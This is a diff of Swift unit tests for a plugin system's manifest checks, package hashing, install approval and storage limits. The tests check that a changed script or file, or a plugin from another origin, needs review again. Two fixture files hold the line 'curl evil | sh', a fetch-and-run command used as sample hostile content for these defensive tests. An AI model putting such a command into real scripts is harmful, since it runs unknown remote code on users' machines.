@@ -49,7 +49,7 @@ final class PluginManifestTests: XCTestCase {
     }
 
     func testHostsAreBareNamesAndWildcardsStayWithinADomain() {
-        for host in ["https://api.github.com", "api.github.com/v1", "*.com", "API.github.com", "*", "localhost:99999", ""] {
+        for host in ["https://api.github.com", "api.github.com/v1", "*.com", "API.github.com", "*", "localhost:99999", "", "*.0.0.1"] {
             assertInvalid(["permissions": ["network"], "hosts": [host]], mentions: "host")
         }
         XCTAssertNoThrow(try manifest(["permissions": ["network"], "hosts": ["api.github.com", "*.example.com", "localhost:3000"]]))
@@ -145,8 +145,9 @@ final class PluginPackageTests: XCTestCase {
                                     files: ["index.html": "<p>", "app.js": "1", "scripts/stats.sh": "echo hi", ".git/config": "x", ".DS_Store": "x"])
         let package = try PluginPackage.read(folder)
         XCTAssertEqual(package.files.map(\.path), ["app.js", "index.html", "plugin.json", "scripts/stats.sh"])
-        XCTAssertEqual(package.scriptHashes, ["stats": PluginPackage.sha256(Data("echo hi".utf8))])
+        XCTAssertEqual(package.scriptHashes["stats"], PluginPackage.sha256(Data("echo hi".utf8)))
         XCTAssertEqual(package.grant.scripts["stats"], package.scriptHashes["stats"])
+        XCTAssertEqual(package.grant.scripts.keys.sorted(), [PluginGrant.filesKey, "stats"], "A plugin with scripts pins all its files too")
         XCTAssertEqual(try package.scriptText("stats"), "echo hi")
     }
 
@@ -250,13 +251,13 @@ final class PluginStoreTests: XCTestCase {
 
         let same = try PluginPackage.read(packages.makePlugin("v2", manifest: ["version": "1.1.0", "permissions": ["clipboard-read"]],
                                                               files: ["index.html": "<p>new</p>"]))
-        record = try store.install(same, source: .folder("/tmp/v2"))
+        record = try store.install(same, source: .folder("/tmp/v1"))
         XCTAssertTrue(try XCTUnwrap(record.approved).covers(same.grant))
         XCTAssertEqual(try store.package(same.manifest.id).manifest.version, "1.1.0")
         XCTAssertEqual(try String(contentsOf: store.folder(for: same.manifest.id).appendingPathComponent("index.html"), encoding: .utf8), "<p>new</p>")
 
         let more = try PluginPackage.read(packages.makePlugin("v3", manifest: ["version": "1.2.0", "permissions": ["clipboard-read", "network"], "hosts": ["api.example.com"]]))
-        record = try store.install(more, source: .folder("/tmp/v3"))
+        record = try store.install(more, source: .folder("/tmp/v1"))
         XCTAssertFalse(try XCTUnwrap(record.approved).covers(more.grant), "An update asking for more waits for review")
     }
 
@@ -265,8 +266,37 @@ final class PluginStoreTests: XCTestCase {
         let first = try PluginPackage.read(packages.makePlugin("a", manifest: manifest, files: ["index.html": "", "go.sh": "echo one"]))
         try store.install(first, source: .folder("/tmp/a"), approving: true)
         let changed = try PluginPackage.read(packages.makePlugin("b", manifest: manifest, files: ["index.html": "", "go.sh": "curl evil | sh"]))
-        let record = try store.install(changed, source: .folder("/tmp/b"))
+        let record = try store.install(changed, source: .folder("/tmp/a"))
         XCTAssertFalse(try XCTUnwrap(record.approved).covers(changed.grant))
+    }
+
+    func testAnyChangedFileOfAPluginWithScriptsNeedsReview() throws {
+        let manifest: [String: Any] = ["permissions": ["scripts"], "scripts": ["go": "go.sh"]]
+        let first = try PluginPackage.read(packages.makePlugin("a", manifest: manifest, files: ["index.html": "", "go.sh": "sh lib.sh", "lib.sh": "echo one"]))
+        try store.install(first, source: .folder("/tmp/a"), approving: true)
+        // The script it runs is the same; the file that script runs is not.
+        let changed = try PluginPackage.read(packages.makePlugin("b", manifest: manifest, files: ["index.html": "", "go.sh": "sh lib.sh", "lib.sh": "curl evil | sh"]))
+        let approved = try XCTUnwrap(store.install(changed, source: .folder("/tmp/a")).approved)
+        XCTAssertFalse(approved.covers(changed.grant))
+        XCTAssertEqual(approved.additions(in: changed.grant).scripts, [PluginGrant.filesKey])
+
+        let pageOnly = try PluginPackage.read(packages.makePlugin("c", manifest: ["permissions": ["clipboard-read"]], files: ["index.html": "<p>1</p>"]))
+        XCTAssertEqual(pageOnly.grant.scripts, [:], "Without scripts, a page's files change freely")
+    }
+
+    func testCodeFromAnotherPlaceGetsNoneOfTheApproval() throws {
+        let release = PluginSource.link("https://github.com/jane/tally/releases/download/v1/tally.frogplugin")
+        XCTAssertTrue(release.sharesOrigin(with: .link("https://GitHub.com/jane/tally/releases/download/v2/tally.frogplugin")))
+        XCTAssertFalse(release.sharesOrigin(with: .link("https://github.com/mallory/tally/releases/download/v2/tally.frogplugin")))
+        XCTAssertFalse(release.sharesOrigin(with: .link("https://example.com/jane/tally.frogplugin")))
+        XCTAssertFalse(PluginSource.file("/tmp/a.frogplugin").sharesOrigin(with: .file("/tmp/a.frogplugin")), "Anyone can make a file")
+        XCTAssertTrue(PluginSource.folder("/tmp/a").sharesOrigin(with: .folder("/tmp/a")))
+
+        let package = try PluginPackage.read(packages.makePlugin(manifest: ["permissions": ["network"], "hosts": ["api.github.com"]]))
+        try store.install(package, source: release, sha256: String(repeating: "a", count: 64), approving: true)
+        XCTAssertNotNil(try store.install(package, source: .link("https://github.com/jane/tally/v2.frogplugin")).approved)
+        XCTAssertNil(try store.install(package, source: .link("https://github.com/mallory/tally/v2.frogplugin")).approved,
+                     "A plugin with the same id from someone else waits for review")
     }
 
     func testRemovingTrashesTheFilesAndTheStorage() throws {
@@ -298,6 +328,9 @@ final class PluginStoreTests: XCTestCase {
         try storage.set("list", json: nil)
         XCTAssertEqual(try storage.keys(), ["name"])
         XCTAssertThrowsError(try storage.set("big", json: String(repeating: "x", count: PluginStorage.maximumBytes)))
+        // Slashes take twice the room once written, and the limit counts what is written, so it always reads back.
+        XCTAssertThrowsError(try storage.set("slashes", json: "\"" + String(repeating: "/", count: PluginStorage.maximumBytes * 3 / 5) + "\""))
+        XCTAssertEqual(try PluginStorage(folder: root.appendingPathComponent("data")).keys(), ["name"])
         XCTAssertThrowsError(try storage.set("", json: "1"))
     }
 }
